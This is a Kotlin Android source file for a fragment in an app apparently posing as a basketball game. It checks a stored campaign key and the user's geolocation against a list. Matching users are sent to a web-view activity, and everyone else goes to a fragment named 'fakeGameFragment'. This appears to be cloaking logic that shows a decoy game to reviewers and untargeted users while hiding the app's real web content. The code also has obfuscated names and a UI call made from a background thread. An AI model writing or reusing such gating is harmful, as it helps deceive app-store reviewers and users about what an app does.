package com.mobirix.basketballkin

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.google.android.material.snackbar.Snackbar
import com.mobirix.basketballkin.DataStoreManager.Companion.listOfAllGeoDataStoreKey
import com.mobirix.basketballkin.DataStoreManager.Companion.namingDataStoreKey
import com.mobirix.basketballkin.DataStoreManager.Companion.userGeoDataStoreKey
import com.mobirix.basketballkin.databinding.FragmentFourMakeGeoCheckBinding
import com.mobirix.basketballkin.utiiils.Constance
import dagger.hilt.android.AndroidEntryPoint
import dagger.hilt.android.scopes.ActivityScoped
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

@AndroidEntryPoint
@ActivityScoped
class FourMakeGeoCheckFragment : Fragment() {

    @Inject
    lateinit var dataManager: DataStoreManager

    private var _binding: FragmentFourMakeGeoCheckBinding? = null
    private val binding
        get() = _binding ?: throw RuntimeException("FragmentFourMakeGeoCheckBinding = null")


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentFourMakeGeoCheckBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {

        Log.d("lolo", "four frag")
        try {
            lifecycleScope.launch {
                val naming = dataManager.readStringFromDataStore(key = namingDataStoreKey)
                    ?: Constance.KEY_NO_DATA
                val geoUser =
                    dataManager.readStringFromDataStore(key = userGeoDataStoreKey) ?: "no geeeeo"
                val listGeo = dataManager.readStringFromDataStore(key = listOfAllGeoDataStoreKey)
                    ?: Constance.KEY_NO_DATA

                delay(1000)

                withContext(Dispatchers.IO){
                    Snackbar.make(
                        binding.root, "naming in four frag is $naming",
                        Snackbar.LENGTH_SHORT
                    ).show()
                }
                delay(1000)

                if (naming.contains(Constance.KEY_TDB2gtgt) || listGeo.contains(geoUser)) {
                    goToVebViev()
                } else {
                    findNavController().navigate(R.id.action_fourMakeGeoCheckFragment_to_fakeGameFragment)
                }
            }


        } catch (e: Exception) {
            detdefdfe()
        }
        super.onViewCreated(view, savedInstanceState)
    }

    private fun goToVebViev() {
        val intent = Intent(requireActivity(), BrovisierActivity::class.java)
        startActivity(intent)
        requireActivity().finish()
    }

    private fun detdefdfe() {
        Snackbar.make(
            binding.root,
            "Oops something went wrong, please try again...",
            Snackbar.LENGTH_LONG
        ).show()
        Log.d("lolo", "catch exception in FourMakeGeoCheckFragment")
        requireActivity().finish()
    }


    override fun onDestroy() {
        _binding = null
        super.onDestroy()
    }
}